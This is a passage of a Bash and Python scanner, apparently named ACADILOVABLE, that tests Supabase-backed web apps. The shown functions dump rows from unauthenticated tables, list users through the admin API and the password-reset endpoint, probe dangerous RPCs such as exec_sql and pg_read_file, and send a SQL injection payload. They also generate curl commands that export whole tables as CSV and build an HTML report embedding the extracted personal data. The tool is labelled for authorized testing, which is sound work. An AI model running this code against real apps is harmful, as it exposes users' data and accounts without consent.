# ─────────────────────────────────────────────────────────────────────────────
query_database() {
    section "DATABASE DEEP QUERY"
    [[ "$SUPABASE" == "{SUPABASE_URL}" || ${#TABLES[@]} -eq 0 ]] && { warn "No Supabase tables to query"; return; }
    local limit=10; $FULL && limit=100
    local tbl_list; tbl_list=$(IFS=','; echo "${TABLES[*]}")
    python3 "${PYDIR}/dbquery.py" "$SUPABASE" "$ANON_KEY" "$tbl_list" "$DBDUMP" "$limit" 2>/dev/null || warn "DB query partial"
    python3 -c "
import json
try:
    d=json.load(open('${DBDUMP}'))
    for e in d:
        if isinstance(e,dict) and e.get('row_count',0)>0:
            print(f'OPEN|{e[\"table\"]}|{e[\"row_count\"]}')
            if e.get('pii_cols'): print(f'PII|{e[\"table\"]}|{e[\"pii_cols\"]}')
except: pass
" 2>/dev/null | while IFS='|' read -r kind tbl val; do
        case "$kind" in
            OPEN) vuln "Table '${tbl}' returned ${val} row(s) without authentication"; log "OPEN_TABLE:${tbl}:rows=${val}" ;;
            PII)  warn "PII columns in '${tbl}': ${val}" ;;
        esac
    done
}

enumerate_users() {
    section "USER ENUMERATION ENGINE"
    [[ "$SUPABASE" == "{SUPABASE_URL}" ]] && return

    # Admin API
    local r; r=$(hprobe "GET" "${SUPABASE}/auth/v1/admin/users?per_page=100")
    local st="${r%%|||*}"; local bd="${r#*|||}"
    if [[ "$st" == "200" ]]; then
        vuln "Admin users API accessible — full user list exposed!"; log "ADMIN_USERS:exposed"
        python3 -c "
import sys,json
try:
    d=json.loads(sys.argv[1])
    users=d.get('users',d) if isinstance(d,dict) else d
    if isinstance(users,list):
        print(f'  Users found: {len(users)}')
        for u in users[:5]:
            print(f'  {str(u.get(\"id\",\"\"))[:8]}... {u.get(\"email\",\"?\")} role={u.get(\"role\",\"?\")}')
except: pass
" "$bd" 2>/dev/null || true
        echo "$bd" > "$USERSF"
    else
        ok "Admin API protected (${st})"
    fi

    # User tables
    local user_tables=("profiles" "users" "accounts" "members" "customers" "user_profiles")
    for t in "${TABLES[@]}"; do
        echo "$t" | grep -qiE 'user|profile|member|customer|person|client' && user_tables+=("$t")
    done
    for tbl in $(printf '%s\n' "${user_tables[@]}" | sort -u); do
        local ru; ru=$(hprobe "GET" "${SUPABASE}/rest/v1/${tbl}?select=*&limit=20")
        local su="${ru%%|||*}"; local bu="${ru#*|||}"
        if [[ "$su" == "200" && "$bu" != "[]" && ${#bu} -gt 5 ]]; then
            vuln "User data in '${tbl}' accessible!"; log "USER_TABLE:${tbl}"
        fi
    done

    # Password reset enumeration
    local b1; b1=$(hprobe "POST" "${SUPABASE}/auth/v1/recover" "" '{"email":"test@gmail.com"}')
    local b2; b2=$(hprobe "POST" "${SUPABASE}/auth/v1/recover" "" '{"email":"nonexist_acadilovable@invalid.test"}')
    local body1="${b1#*|||}"; local body2="${b2#*|||}"
    [[ "$body1" != "$body2" && ${#body1} -ne ${#body2} ]] && \
        vuln "User enumeration via /auth/v1/recover — different responses" && log "USER_ENUM:recover"

    # Audit log
    local ra; ra=$(hprobe "GET" "${SUPABASE}/auth/v1/admin/audit_log?per_page=20")
    [[ "${ra%%|||*}" == "200" ]] && vuln "Auth audit log exposed!" && log "AUDIT_LOG:exposed"
}

probe_rpc() {
    section "RPC DATABASE ACCESS PROBING"
    [[ "$SUPABASE" == "{SUPABASE_URL}" ]] && return
    local dangerous=("exec_sql" "run_sql" "execute_sql" "raw_query" "query" "execute"
                     "pg_sleep" "pg_read_file" "pg_ls_dir" "get_schema" "list_tables"
                     "dump_table" "admin_exec" "admin_sql" "run_query" "sql_exec")
    info "Probing ${#dangerous[@]} dangerous RPC patterns..."
    for rpc in "${dangerous[@]}"; do
        local url="${SUPABASE}/rest/v1/rpc/${rpc}"
        local r; r=$(hprobe "POST" "$url" "" '{"query":"SELECT 1"}')
        local st="${st%%|||*}" 2>/dev/null; st="${r%%|||*}"
        [[ "$st" == "200" ]] && vuln "Dangerous RPC callable: ${rpc}" && log "DANGEROUS_RPC:${rpc}"
    done
    # Discovered RPCs — SQLi test
    for rpc in "${RPCS[@]}"; do
        local url="${SUPABASE}/rest/v1/rpc/${rpc}"
        local r; r=$(hprobe "POST" "$url" "" '{"id":"1'"'"' OR 1=1--"}')
        local bd="${r#*|||}"
        echo "$bd" | grep -qiE 'syntax error|pg_error|sql.*error|ERROR.*column' && \
            warn "SQL error disclosure in RPC '${rpc}'" && log "SQLI_HINT:${rpc}"
    done
    # Direct pg catalog access
    for tbl in "information_schema.tables" "pg_tables"; do
        local r; r=$(hprobe "GET" "${SUPABASE}/rest/v1/${tbl}?limit=5")
        [[ "${r%%|||*}" == "200" ]] && vuln "Direct access to ${tbl} via PostgREST!" && log "PG_TABLE:${tbl}"
    done
    ok "RPC probe complete"
}

# ─────────────────────────────────────────────────────────────────────────────
# CURL COMMANDS GENERATOR
# ─────────────────────────────────────────────────────────────────────────────
generate_curls() {
    {
        echo "#!/usr/bin/env bash"
        echo "# ACADILOVABLE — curl commands for: $APP_URL"
        echo "# Generated: $(date -u)"
        echo ""
        echo "ANON='${ANON_KEY}'"
        echo ""
        echo "# ── REST Tables ─────────────────────────────────────────────────────"
        for t in "${TABLES[@]}"; do
            echo "# ${t}"
            echo "curl -sS '${SUPABASE}/rest/v1/${t}?select=*&limit=20' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\""
            echo "curl -sS '${SUPABASE}/rest/v1/${t}?select=*' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\" -H 'Accept: text/csv'"
            echo ""
        done
        echo "# ── RPCs ─────────────────────────────────────────────────────────────"
        for r in "${RPCS[@]}"; do
            echo "curl -sS -X POST '${SUPABASE}/rest/v1/rpc/${r}' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\" -H 'Content-Type: application/json' -d '{}'"
        done
        echo ""
        echo "# ── Edge Functions ───────────────────────────────────────────────────"
        for e in "${EDGES[@]}"; do
            echo "curl -sS -X POST '${SUPABASE}/functions/v1/${e}' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\" -H 'Content-Type: application/json' -d '{}'"
        done
        echo ""
        echo "# ── Auth & Admin ──────────────────────────────────────────────────────"
        echo "curl -sS '${SUPABASE}/auth/v1/admin/users?per_page=100' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\""
        echo "curl -sS '${SUPABASE}/auth/v1/settings' -H \"apikey: \$ANON\""
        echo "curl -sS '${SUPABASE}/rest/v1/' -H 'Accept: application/openapi+json' -H \"apikey: \$ANON\""
        echo ""
        echo "# ── Storage ───────────────────────────────────────────────────────────"
        echo "curl -sS '${SUPABASE}/storage/v1/bucket' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\""
        for b in "${BUCKETS[@]}"; do
            echo "curl -sS -X POST '${SUPABASE}/storage/v1/object/list/${b}' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\" -H 'Content-Type: application/json' -d '{\"prefix\":\"\",\"limit\":50}'"
        done
        echo ""
        echo "# ── Discovered API Calls ─────────────────────────────────────────────"
        for ep in "${APICALLS[@]}"; do
            local m="${ep%%||*}"; local p="${ep#*||}"
            [[ "$p" != http* ]] && p="${APP_URL}${p}"
            echo "curl -sS -X ${m} '${p}' -H \"apikey: \$ANON\" -H \"Authorization: Bearer \$ANON\""
        done
    } > "$CURLF" 2>/dev/null && chmod +x "$CURLF" || true
    ok "curl commands: $CURLF"
}

# ─────────────────────────────────────────────────────────────────────────────
# HTML REPORT
# ─────────────────────────────────────────────────────────────────────────────
generate_report() {
    section "GENERATING HTML REPORT"

    # Collect all scan results for the report
    local vuln_json; vuln_json=$(python3 -c "import json; print(json.dumps(${VULNS[@]+\"\"}[:]  if False else []))" 2>/dev/null || echo '[]')
    local ep_count; ep_count=$(wc -l < "$ENDPOINTS" 2>/dev/null || echo 0)
    local crawl_count="${#CRAWLED[@]}"
    local sens_count="${#SENSFOUND[@]}"
    local vc="$VULN_COUNT"
    local mc="${#MCFGS[@]}"
    local tbl_count="${#TABLES[@]}"
    local rpc_count="${#RPCS[@]}"
    local edge_count="${#EDGES[@]}"
    local route_count="${#ROUTES[@]}"

    python3 << PYEOF
import json, os, html, re
from datetime import datetime

app_url="${APP_URL}"; domain="${DOMAIN}"; supabase="${SUPABASE}"
anon="${ANON_KEY:0:48}..."; bundle="${BUNDLE}"
out_dir="${OUT_DIR}"; reportf="${REPORTF}"
vc=${vc}; mc=${mc}; ep_count=${ep_count}
crawl_count=${crawl_count}; sens_count=${sens_count}
tbl_count=${tbl_count}; rpc_count=${rpc_count}
edge_count=${edge_count}; route_count=${route_count}

vulns_raw="""${VULNS[*]+$(printf '%s\n' "${VULNS[@]}")}"""
mcfgs_raw="""${MCFGS[*]+$(printf '%s\n' "${MCFGS[@]}")}"""
routes_raw="""${ROUTES[*]+$(printf '%s\n' "${ROUTES[@]}")}"""
tables_raw="""${TABLES[*]+$(printf '%s\n' "${TABLES[@]}")}"""

vulns=[v for v in vulns_raw.strip().split('\n') if v.strip()]
mcfgs=[m for m in mcfgs_raw.strip().split('\n') if m.strip()]
routes=[r for r in routes_raw.strip().split('\n') if r.strip()]
tables=[t for t in tables_raw.strip().split('\n') if t.strip()]

def rj(f):
    try:
        with open(f) as fp: return json.load(fp)
    except: return {}

plat=rj(f'{out_dir}/platform.json')
owasp=rj(f'{out_dir}/owasp.json')
db=rj(f'{out_dir}/db_dump.json')
crawl=rj(f'{out_dir}/crawl.json')
sens=rj(f'{out_dir}/sensitive_files.json')
fb=rj(f'{out_dir}/firebase_scan.json')
nj=rj(f'{out_dir}/nextjs_scan.json')
gql=rj(f'{out_dir}/graphql_scan.json')
inj=rj(f'{out_dir}/injection.json')
ssrf=rj(f'{out_dir}/ssrf.json')
api=rj(f'{out_dir}/apifuzz.json')

sev_col={'CRITICAL':'#8e44ad','HIGH':'#e74c3c','MEDIUM':'#f39c12','LOW':'#27ae60','INFO':'#3498db'}
sev_order={'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}
vc2=int(vc); mc2=int(mc)
main_sev='LOW'; main_col='#27ae60'
if vc2>=3:  main_sev='MEDIUM';   main_col='#f39c12'
if vc2>=6:  main_sev='HIGH';     main_col='#e74c3c'
if vc2>=10: main_sev='CRITICAL'; main_col='#8e44ad'

def esc(s): return html.escape(str(s))

# Build sections
vuln_li=''.join(f'<li class="vuln">⚠ {esc(v)}</li>' for v in vulns) or '<li class="ok">✅ None detected</li>'
mcfg_li=''.join(f'<li class="mc">⚙ {esc(v)}</li>'  for v in mcfgs) or '<li class="ok">✅ None</li>'
route_li=''.join(f'<li><code>{esc(r)}</code></li>'  for r in routes) or '<li>None discovered</li>'
tbl_li=''.join(f'<li><code>{esc(t)}</code></li>'    for t in tables) or '<li>None</li>'

# Platform info
vp=', '.join(plat.get('vibe_platform',[]) or ['Unknown'])
fe=', '.join(plat.get('frontend',[])      or ['Unknown'])
be=', '.join(plat.get('backend',[])       or ['Unknown'])
auth=', '.join(plat.get('auth',[])        or ['Unknown'])
host=', '.join(plat.get('hosting',[])     or ['Unknown'])

# OWASP findings table
owasp_findings=sorted(owasp.get('findings',[]),key=lambda f: sev_order.get(f.get('severity','INFO'),5))
owasp_rows=''
for f in owasp_findings:
    sev=f.get('severity','?'); cls={'CRITICAL':'sev-crit','HIGH':'sev-high','MEDIUM':'sev-med','LOW':'sev-low','INFO':'sev-info'}.get(sev,'')
    owasp_rows+=(f'<tr class="{cls}"><td><span class="sev-badge {cls}">{esc(sev)}</span></td>'
                 f'<td>{esc(f.get("title","?"))}</td><td><code>{esc(f.get("owasp","?"))}</code></td>'
                 f'<td><code>{esc(f.get("mitre","?"))}</code></td><td><code>{esc(f.get("wstg","?"))}</code></td>'
                 f'<td>{f.get("cvss_score",0)}</td>'
                 f'<td><small>{esc(f.get("evidence",""))[:60]}</small></td></tr>')

# Endpoints table
ep_rows=''
if os.path.exists(f'{out_dir}/endpoints.txt'):
    with open(f'{out_dir}/endpoints.txt') as f_:
        for line in f_:
            parts=line.strip().split('|')
            if len(parts)>=4:
                m2,u,src,tag=parts[0],parts[1],parts[2],parts[3]
                ep_rows+=f'<tr><td><span class="b {m2.lower()}">{esc(m2)}</span></td><td><code>{esc(u[:100])}</code></td><td>{esc(src)}</td><td>{esc(tag)}</td></tr>'

# Crawl rows
crawl_rows=''.join(
    f'<tr class="{"interesting" if r.get("interesting") and r.get("status")==200 else ""}"><td>{r.get("status",0)}</td>'
    f'<td><a href="{esc(r.get("url",""))}" target="_blank"><code>{esc(r.get("url","")[:100])}</code></a></td>'
    f'<td>{esc(r.get("ct","")[:30])}</td><td>{r.get("size",0)}</td></tr>'
    for r in (crawl or [])[:300] if isinstance(r,dict))

# Sensitive file rows
sens_rows=''.join(
    f'<tr class="{"critical" if r.get("secrets") else ("found" if r.get("status")==200 else "other")}">'
    f'<td>{r.get("status",0)}</td><td><code>{esc(r.get("path",""))}</code></td>'
    f'<td><a href="{esc(r.get("url",""))}" target="_blank">open</a></td>'
    f'<td>{esc(str(r.get("secrets",[""])[0])[:60]) if r.get("secrets") else ""}</td></tr>'
    for r in (sens or []) if isinstance(r,dict) and r.get("status",404)!=404)

# DB sample
db_sample=''
for entry in (db or []):
    if not isinstance(entry,dict) or not entry.get('rows'): continue
    t2=entry['table']; rows=entry['rows']
    cols=list(rows[0].keys())[:8] if rows and isinstance(rows[0],dict) else []
    db_sample+=f'<h4>{esc(t2)} ({entry.get("row_count",0)} rows sampled)</h4>'
    if cols:
        db_sample+='<div class="scroll"><table><thead><tr>'+''.join(f'<th>{esc(c)}</th>' for c in cols)+'</tr></thead><tbody>'
        for row in rows[:5]:
            db_sample+='<tr>'+''.join(f'<td><code>{esc(str(row.get(c,""))[:40])}</code></td>' for c in cols)+'</tr>'
        db_sample+='</tbody></table></div>'

# Combine all platform scan vulns
all_platform_vulns=[]
for scan_d in [fb,nj,gql,inj,ssrf,api]:
    all_platform_vulns.extend(scan_d.get('vulns',[]) if isinstance(scan_d,dict) else [])

now=datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')

html_out=f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ACADILOVABLE — {esc(domain)}</title>
<style>
:root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#c9d1d9;--muted:#8b949e;--acc:#58a6ff;--red:#f85149;--grn:#3fb950;--yel:#d29922;--pur:#bc8cff;}}
*{{box-sizing:border-box;margin:0;padding:0;}}
body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:2rem;font-size:13px;line-height:1.55;}}
h1{{color:var(--acc);font-size:1.9rem;margin-bottom:.2rem;}}
h2{{color:var(--acc);font-size:.95rem;margin:1.2rem 0 .6rem;border-bottom:1px solid var(--border);padding-bottom:.3rem;}}
h4{{color:var(--muted);margin:.6rem 0 .25rem;font-size:.85rem;}}
a{{color:var(--acc);text-decoration:none;}}
.sub{{color:var(--muted);margin-bottom:1.75rem;font-size:.8rem;}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(115px,1fr));gap:.55rem;margin-bottom:1.5rem;}}
.card{{background:var(--card);border:1px solid var(--border);border-radius:7px;padding:.85rem;}}
.card .n{{font-size:1.8rem;font-weight:700;}}.card .l{{color:var(--muted);font-size:.7rem;margin-top:.15rem;}}
.sev{{color:{main_col};font-size:1.8rem;font-weight:700;}}
.bsev{{display:inline-block;padding:.1rem .4rem;border-radius:3px;font-size:.7rem;font-weight:700;background:{main_col};color:#fff;}}
.blk{{background:var(--card);border:1px solid var(--border);border-radius:7px;padding:1rem;margin-bottom:1rem;}}
code{{background:#0d1117;padding:.07rem .3rem;border-radius:3px;font-family:monospace;color:var(--acc);font-size:.78rem;word-break:break-all;}}
table{{width:100%;border-collapse:collapse;font-size:.8rem;margin-top:.4rem;}}
th,td{{padding:.28rem .5rem;border-bottom:1px solid var(--border);text-align:left;vertical-align:top;}}
th{{color:var(--muted);font-weight:500;background:var(--bg);}}
.vuln{{color:var(--red);font-weight:500;padding:.22rem 0;border-bottom:1px solid #21262d;}}
.mc{{color:var(--yel);padding:.22rem 0;border-bottom:1px solid #21262d;}}
.ok{{color:var(--grn);padding:.22rem 0;border-bottom:1px solid #21262d;}}
.critical,.sev-crit{{color:var(--pur);font-weight:700;}}
.sev-high{{color:var(--red);font-weight:600;}}
.sev-med{{color:var(--yel);}}
.sev-low{{color:var(--grn);}}
.sev-info{{color:var(--acc);}}
.interesting{{background:#1b1b1b;}}
.found{{color:var(--yel);}}
ul{{list-style:none;padding:0;}}
.b{{display:inline-block;padding:.07rem .3rem;border-radius:3px;font-size:.7rem;font-weight:700;color:#fff;min-width:44px;text-align:center;margin-right:.2rem;}}
.get{{background:#0075ca;}}.post{{background:#238636;}}.put,.patch{{background:#9a6700;}}.delete{{background:#da3633;}}.head{{background:#6e40c9;}}
.sev-badge{{display:inline-block;padding:.07rem .32rem;border-radius:3px;font-size:.7rem;font-weight:700;color:#fff;}}
.sev-badge.sev-crit{{background:var(--pur);}}.sev-badge.sev-high{{background:var(--red);}}
.sev-badge.sev-med{{background:var(--yel);color:#000;}}.sev-badge.sev-low{{background:var(--grn);}}
.sev-badge.sev-info{{background:var(--acc);}}
.tabs{{display:flex;gap:.3rem;margin-bottom:.6rem;flex-wrap:wrap;}}
.tab{{padding:.25rem .75rem;border-radius:3px;background:#21262d;color:var(--muted);cursor:pointer;font-size:.77rem;border:1px solid var(--border);user-select:none;}}
.tab.active,.tab:hover{{background:var(--acc);color:#0d1117;font-weight:600;}}
.tc{{display:none;}}.tc.active{{display:block;}}
input[type=text]{{width:100%;padding:.28rem .55rem;background:#0d1117;border:1px solid var(--border);border-radius:3px;color:var(--text);font-size:.8rem;margin-bottom:.55rem;outline:none;}}
.scroll{{overflow-x:auto;max-height:420px;overflow-y:auto;}}
footer{{color:var(--muted);font-size:.72rem;margin-top:2.5rem;border-top:1px solid var(--border);padding-top:.9rem;}}
</style></head><body>
<h1>⚡ ACADILOVABLE</h1>
<p class="sub">Vibe-Coding Security Report · {now} · {esc(domain)}</p>

<div class="grid">
  <div class="card"><div class="sev">{vc}</div><div class="l">Vulnerabilities <span class="bsev">{main_sev}</span></div></div>
  <div class="card"><div class="n">{mc}</div><div class="l">Misconfigurations</div></div>
  <div class="card"><div class="n">{ep_count}</div><div class="l">Endpoints</div></div>
  <div class="card"><div class="n">{crawl_count}</div><div class="l">Crawled URLs</div></div>
  <div class="card"><div class="n">{sens_count}</div><div class="l">Sensitive Files</div></div>
  <div class="card"><div class="n">{tbl_count}</div><div class="l">DB Tables</div></div>
  <div class="card"><div class="n">{rpc_count}</div><div class="l">RPCs</div></div>
  <div class="card"><div class="n">{edge_count}</div><div class="l">Edge Fns</div></div>
  <div class="card"><div class="n">{route_count}</div><div class="l">SPA Routes</div></div>
  <div class="card"><div class="n">{len(owasp_findings)}</div><div class="l">OWASP Findings</div></div>
</div>

<div class="blk">
  <h2>🎯 Target & Stack</h2>
  <table>
    <tr><th>App</th><td><a href="{esc(app_url)}" target="_blank"><code>{esc(app_url)}</code></a></td></tr>
    <tr><th>Supabase</th><td><code>{esc(supabase)}</code></td></tr>
    <tr><th>anon Key</th><td><code>{esc(anon)}</code></td></tr>
    <tr><th>Bundle</th><td><code>{esc(bundle)}</code></td></tr>
    <tr><th>Vibe Platform</th><td><strong>{esc(vp)}</strong></td></tr>
    <tr><th>Frontend</th><td>{esc(fe)}</td></tr>
    <tr><th>Backend/BaaS</th><td>{esc(be)}</td></tr>
    <tr><th>Auth</th><td>{esc(auth)}</td></tr>
    <tr><th>Hosting</th><td>{esc(host)}</td></tr>
  </table>
</div>

<div class="blk"><h2>🚨 Vulnerabilities ({vc})</h2><ul>{vuln_li}</ul></div>
<div class="blk"><h2>⚙️ Misconfigurations ({mc})</h2><ul>{mcfg_li}</ul></div>

<div class="blk">
  <h2>🛡️ OWASP Top 10 · WSTG · MITRE ATT&amp;CK</h2>
  <div class="scroll"><table>
    <thead><tr><th>Severity</th><th>Finding</th><th>OWASP</th><th>MITRE</th><th>WSTG</th><th>CVSS</th><th>Evidence</th></tr></thead>
    <tbody>{owasp_rows or '<tr><td colspan=7>No additional OWASP findings</td></tr>'}</tbody>
  </table></div>
</div>

<div class="blk">
  <h2>🕷️ Crawler + Sensitive Files</h2>
  <div class="tabs">
    <div class="tab active" onclick="sw('cr-c')">Crawled ({crawl_count})</div>
    <div class="tab" onclick="sw('cr-s')">Sensitive Files ({sens_count})</div>
  </div>
  <div id="cr-c" class="tc active">
    <input type="text" id="cr-q" placeholder="Filter URLs..." oninput="ft('cr-t','cr-q')">
    <div class="scroll"><table id="cr-t"><thead><tr><th>Status</th><th>URL</th><th>Content-Type</th><th>Size</th></tr></thead>
    <tbody>{crawl_rows or '<tr><td colspan=4>No crawl data</td></tr>'}</tbody></table></div>
  </div>
  <div id="cr-s" class="tc">
    <div class="scroll"><table><thead><tr><th>Status</th><th>Path</th><th>Link</th><th>Secrets</th></tr></thead>
    <tbody>{sens_rows or '<tr><td colspan=4>No accessible sensitive files found</td></tr>'}</tbody></table></div>
  </div>
</div>

<div class="blk">
  <h2>🗺️ Endpoint Map ({ep_count})</h2>
  <input type="text" id="ep-q" placeholder="Filter..." oninput="ft('ep-t','ep-q')">
  <div class="scroll"><table id="ep-t"><thead><tr><th>Method</th><th>URL</th><th>Source</th><th>Tag</th></tr></thead>
  <tbody>{ep_rows or '<tr><td colspan=4>No endpoints mapped</td></tr>'}</tbody></table></div>
</div>

<div class="blk">
  <h2>🗄️ Database</h2>
  <div class="tabs">
    <div class="tab active" onclick="sw('db-t')">Tables ({tbl_count})</div>
    <div class="tab" onclick="sw('db-d')">Extracted Data</div>
    <div class="tab" onclick="sw('db-r')">SPA Routes ({route_count})</div>
  </div>
  <div id="db-t" class="tc active"><ul>{tbl_li}</ul></div>
  <div id="db-d" class="tc">{db_sample or '<em>No data extracted (RLS active or no Supabase)</em>'}</div>
  <div id="db-r" class="tc"><ul>{route_li}</ul></div>
</div>

<footer>ACADILOVABLE · Authorized security testing only · {datetime.utcnow().year} · 
Standards: OWASP Top 10 (2021) · OWASP WSTG · MITRE ATT&amp;CK · CVSS v3.1</footer>
<script>
function sw(id){{const b=document.getElementById(id).closest('.blk');
  b.querySelectorAll('.tc,.tab').forEach(e=>e.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  const t=b.querySelector('[onclick="sw(\''+id+'\')"]');if(t)t.classList.add('active');}}
function ft(tid,qid){{const q=document.getElementById(qid).value.toLowerCase();
  document.querySelectorAll('#'+tid+' tbody tr').forEach(r=>{{
    r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';}});}}
</script></body></html>"""

with open(reportf,'w') as f: f.write(html_out)
print(f'Report: {reportf}')
PYEOF
}


# ─────────────────────────────────────────────────────────────────────────────
# DETECT-ONLY MODE — quick vibe-coding platform fingerprint
# ─────────────────────────────────────────────────────────────────────────────
run_detect_only() {
    step "1" "VIBE-CODING PLATFORM DETECTION"
    write_python_helpers 2>/dev/null || true
    ok "Helpers ready"

    # Fetch homepage and headers
    local hdr_file="${OUT_DIR}/raw_headers.txt"
    local html_file="${OUT_DIR}/detect_html.txt"
    info "Fetching ${APP_URL} ..."
    hhead "$APP_URL" > "$hdr_file" 2>/dev/null || true
    hget  "$APP_URL" > "$html_file" 2>/dev/null || true

    # Download bundle (just the index to find assets, then the main JS)
    local asset_urls=()
    readarray -t asset_urls < <(fetch_assets 2>/dev/null || true)
    if [[ ${#asset_urls[@]} -gt 0 ]]; then
        # Download only the largest JS (likely main bundle)
        local first_asset="${asset_urls[0]}"
        local clean="${first_asset#/}"
        curl -sS --max-time "$TIMEOUT" -A "$UA"              -o "${OUT_DIR}/$(basename "$first_asset")"              "${APP_URL}/${clean}" 2>/dev/null | tr -d '"'"'\000'"'" || true
        BUNDLE=$(find_bundle 2>/dev/null || true)
        [[ -n "$BUNDLE" ]] && cat "$BUNDLE" | tr -d '"'"'\000'"'" > "${OUT_DIR}/bundle.txt" 2>/dev/null || true
    fi
    [[ ! -f "${OUT_DIR}/bundle.txt" ]] && touch "${OUT_DIR}/bundle.txt"

    # Run platform detection
    python3 "${PYDIR}/platform.py" "$APP_URL" "${OUT_DIR}/bundle.txt" "$hdr_file"         > "$PLATFORM_JSON" 2>/dev/null || echo '"{}' > "$PLATFORM_JSON"

    # Pretty-print result
    local elapsed=$(( $(date +%s) - ${SCAN_START:-$(date +%s)} ))
    echo ""
    echo "  ┌─────────────────────────────────────────────────────────────┐"
    printf "  │  DETECTION RESULT: %-42s│\n" "${APP_URL:0:42}"
    echo "  └─────────────────────────────────────────────────────────────┘"
    echo ""

    python3 - << PYEOF
import json, sys
try:
    d = json.load(open("${PLATFORM_JSON}"))
except:
    print("  Could not read detection results"); sys.exit(1)

vp   = d.get("vibe_platform", [])
fe   = d.get("frontend",      [])
be   = d.get("backend",       [])
orm  = d.get("orm",           [])
auth = d.get("auth",          [])
host = d.get("hosting",       [])
api  = d.get("api_patterns",  [])
cred = d.get("credentials",   {})

verdict = "YES — likely built with vibe-coding" if vp else "INCONCLUSIVE — no vibe-coding signatures detected"
print(f"  Vibe-Coding?  {verdict}")
print()

def row(label, items):
    if items:
        print(f"  {label+':':<18} {', '.join(items)}")

row("Platform",    vp)
row("Frontend",    fe)
row("Backend/BaaS",be)
row("ORM",         orm)
row("Auth",        auth)
row("Hosting",     host)
row("API patterns",api)

if cred:
    print()
    print("  Credentials found in client bundle:")
    for k, v in cred.items():
        severity = "CRITICAL" if "CRITICAL" in k or "openai" in k.lower() else "WARN"
        print(f"    [{severity}] {k}: {str(v)[:55]}")

if not any([vp, fe, be, orm, auth, host]):
    print()
    print("  No strong vibe-coding indicators found.")
    print("  The app may be built with a traditional approach,")
    print("  or the vibe-coding signatures are not yet in the database.")
PYEOF

    echo ""
    printf "  Elapsed: %ds\n" "$elapsed"
    echo ""

    # Save minimal JSON
    if $JSON_OUT; then
        python3 -c "
import json
from datetime import datetime
d=json.load(open('${PLATFORM_JSON}'))
out={
    'scan_time':  datetime.utcnow().isoformat()+'Z',
    'target':     '${APP_URL}',
    'mode':       'detect-only',
    'is_vibecoding': bool(d.get('vibe_platform',[])),
    'platform':   d
}
with open('${OUT_DIR}/detect.json','w') as f: json.dump(out,f,indent=2)
print('  Detection JSON: ${OUT_DIR}/detect.json')
" 2>/dev/null || true
    fi
}


# ─────────────────────────────────────────────────────────────────────────────
# VALIDATE SCRIPT GENERATOR
# ─────────────────────────────────────────────────────────────────────────────
generate_validate_script() {
    local af_out="${OUT_DIR}/apifuzz.json"
    local tmp_out="${OUT_DIR}/validate_findings.sh"  # sempre funciona

    [[ ! -f "$PYDIR/gen_validate.py" ]] && {
        warn "gen_validate.py ausente — validate não gerado"; return; }
    [[ ! -f "$FINDINGS" ]] && {
        warn "findings.txt ausente — validate não gerado"; return; }
    [[ ! -f "$af_out" ]] && echo '{"endpoints":[]}' > "$af_out"

    # Gerar sempre no OUT_DIR primeiro (caminho seguro, sem complexidade de CWD)
    python3 "${PYDIR}/gen_validate.py" \
        "$FINDINGS" "$ENDPOINTS" "$OUT_DIR" "$APP_URL" "$tmp_out"
    local rc=$?

    if [[ $rc -ne 0 || ! -f "$tmp_out" ]]; then
        warn "Falha ao gerar validate_findings.sh (python exit ${rc})"
        return
    fi

    chmod +x "$tmp_out"

    # Tentar copiar para o diretório do acadilovable.sh (para fácil acesso)
    # Resolve o path real do script em execução
    local script_dir
    if [[ -n "${BASH_SOURCE[0]:-}" ]]; then
        script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)" || script_dir=""
    fi
    # Fallback: usar o diretório atual
    [[ -z "$script_dir" ]] && script_dir="$(pwd)"

    local root_out="${script_dir}/validate_findings.sh"

    if cp "$tmp_out" "$root_out" 2>/dev/null && chmod +x "$root_out"; then
        ok "validate_findings.sh → ${root_out}"
        info "Execute: bash validate_findings.sh"
    else
        # cp falhou (permissão, filesystem read-only etc.)
        # O arquivo no OUT_DIR ainda é válido
        ok "validate_findings.sh → ${tmp_out}"
        info "Execute: bash ${tmp_out}"
        warn "Não foi possível copiar para ${root_out} (sem permissão?)"
    fi
}


# ─────────────────────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
final_summary() {
    local elapsed=$(( $(date +%s) - ${SCAN_START:-$(date +%s)} ))
    local mins=$(( elapsed/60 )) secs=$(( elapsed%60 ))

    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║                ACADILOVABLE — SCAN COMPLETE                 ║${NC}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${BOLD}Target       :${NC} $APP_URL"
    echo -e "  ${BOLD}Supabase     :${NC} ${SUPABASE:-not detected}"
    echo -e "  ${BOLD}Profile      :${NC} ${PROFILE}"
    echo -e "  ${BOLD}Scan time    :${NC} ${mins}m ${secs}s"
    echo -e "  ${BOLD}Endpoints    :${NC} ${#ALLEPS[@]}  (Crawled: ${#CRAWLED[@]})"
    echo -e "  ${BOLD}Sensitive    :${NC} ${#SENSFOUND[@]} accessible files"
    echo -e "  ${BOLD}DB Tables    :${NC} ${#TABLES[@]}  RPCs: ${#RPCS[@]}  Edges: ${#EDGES[@]}"
    echo -e "  ${BOLD}SPA Routes   :${NC} ${#ROUTES[@]}  API calls: ${#APICALLS[@]}"
    echo ""

    if [[ $VULN_COUNT -gt 0 ]]; then
